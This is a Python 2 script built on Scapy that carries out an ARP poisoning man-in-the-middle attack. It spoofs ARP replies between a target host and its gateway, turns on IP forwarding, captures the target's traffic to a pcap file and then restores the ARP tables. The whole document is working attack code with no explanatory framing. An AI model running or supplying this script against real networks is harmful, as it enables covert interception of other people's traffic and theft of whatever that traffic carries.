from scapy.all import *
import sys
import threading
import os

interface = "wlan1"
target_ip =sys.argv[1]
gateway_ip = sys.argv[2]
packet_count = 10000
poisoning = True


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # slightly different method using send
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
    for s,r in responses:
        return r[Ether].src
    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    while poisoning:
        send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=target_mac))
        send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst=gateway_mac))

        time.sleep(2)

    print "[*] ARP poison attack finished."

    return

def setting():
    # set our interface
    conf.iface = interface

    # turn off output
    conf.verb = 0

    print "[*] Setting up %s" % interface

    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        print "[!!!] Failed to get gateway MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

    target_mac = get_mac(target_ip)

    if target_mac is None:
        print "[!!!] Failed to get target MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (target_ip, target_mac)

    # start poison thread
    poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        print "[*] Starting sniffer for %d packets" % packet_count

        bpf_filter = "ip host %s" % target_ip
        packets = sniff(count=packet_count, filter=bpf_filter , iface=interface)

    except KeyboardInterrupt:
        pass

    finally:
        # write out the captured packets
        print "[*] Writing packets to arper.pcap"
        wrpcap('arper.pcap', packets)

        poisoning = False

        # wait for poisoning thread to exit
        time.sleep(2)

        # restore the network
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    sys.exit(0)
